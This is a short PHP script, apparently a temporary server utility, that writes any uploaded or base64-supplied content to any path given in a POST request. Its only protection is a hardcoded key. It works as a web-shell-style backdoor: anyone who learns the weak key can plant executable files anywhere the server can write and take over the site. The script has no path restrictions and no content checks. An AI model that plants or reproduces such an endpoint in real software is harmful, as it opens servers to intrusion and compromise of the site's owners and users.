<?php
// Simple authenticated file writer — DELETE AFTER USE
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(403); exit; }
if (($_POST['k'] ?? '') !== 'ca2026') { http_response_code(403); exit; }

$path    = $_POST['p'] ?? '';
$content = isset($_FILES['f']) ? file_get_contents($_FILES['f']['tmp_name']) : base64_decode($_POST['c'] ?? '');

if (!$path || $content === false || $content === '') { http_response_code(400); echo "bad input"; exit; }

$dir = dirname($path);
if (!is_dir($dir)) mkdir($dir, 0775, true);
$written = file_put_contents($path, $content);
echo $written !== false ? "ok:$written" : "fail";
